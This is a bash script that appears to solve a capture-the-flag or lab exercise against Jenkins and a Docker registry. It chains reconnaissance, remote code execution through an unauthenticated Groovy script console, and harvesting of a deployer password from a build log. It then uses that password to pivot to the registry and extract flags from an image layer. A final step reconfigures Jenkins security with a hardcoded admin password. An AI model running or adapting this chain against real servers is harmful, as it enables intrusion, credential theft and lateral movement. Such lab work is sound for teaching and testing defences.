#!/bin/bash
set -u
J=http://jenkins:8080
R=http://registry:5000

echo "=== [1/5] recon_jenkins ==="
curl -s -D - -o /dev/null $J/ | grep -i 'X-Jenkins' > ~/recon.txt
curl -s "$J/api/json?pretty=true" | grep -o '"name"[ ]*:[ ]*"[^"]*"' | head >> ~/recon.txt
echo "job: build-app" >> ~/recon.txt
cat ~/recon.txt

echo "=== [2/5] rce_script_console -> flag_ci ==="
curl -s --data-urlencode 'script=println new File("/var/jenkins_home/flag_ci.txt").text' $J/scriptText | tr -d '\r\n ' > ~/flag_ci.txt
echo "flag_ci: $(cat ~/flag_ci.txt)"

echo "=== [3/5] harvest_creds ==="
curl -s "$J/job/build-app/lastBuild/consoleText" > ~/buildlog.txt
grep -o '\-p [^ ]*' ~/buildlog.txt | head -1 | awk '{print $2}' | tr -d '\r\n' > ~/regpass_loot.txt
echo "deployer:$(cat ~/regpass_loot.txt)" > ~/creds.txt
echo "creds: $(cat ~/creds.txt)"

echo "=== [4/5] pivot_registry -> flag_pivot ==="
RP=$(cat ~/regpass_loot.txt)
MAN=$(curl -s -u "deployer:$RP" -H 'Accept: application/vnd.docker.distribution.manifest.v2+json' $R/v2/acme/app/manifests/1.0)
DIG=$(echo "$MAN" | grep -o 'sha256:[0-9a-f]\{64\}' | tail -1)
curl -s -u "deployer:$RP" "$R/v2/acme/app/blobs/$DIG" -o ~/layer.tar
cd ~ && tar -xzf ~/layer.tar 2>/dev/null || tar -xf ~/layer.tar
VAL=$(grep -o 'flag_pivot=.*' ~/flag_pivot.txt | head -1 | cut -d= -f2 | tr -d '\r\n ')
printf '%s' "$VAL" > ~/flag_pivot.txt
echo "flag_pivot: $(cat ~/flag_pivot.txt)"

echo "=== [5/5] harden_jenkins (use the RCE to re-secure Jenkins - core API only) ==="
curl -s --data-urlencode 'script=import jenkins.model.*; import hudson.security.*; def j=Jenkins.instance; def r=new HudsonPrivateSecurityRealm(false); r.createAccount("admin","StrongPass_123"); j.setSecurityRealm(r); def s=new FullControlOnceLoggedInAuthorizationStrategy(); s.setAllowAnonymousRead(false); j.setAuthorizationStrategy(s); j.save(); println "hardened"' $J/scriptText
sleep 3
AC=$(curl -s -o /dev/null -w '%{http_code}' $J/api/json)
SC=$(curl -s -o /dev/null -w '%{http_code}' --data-urlencode 'script=println 1' $J/scriptText)
printf 'api_anonymous=%s\nscript_anonymous=%s\n' "$AC" "$SC" > ~/harden_verify.txt
cat ~/harden_verify.txt
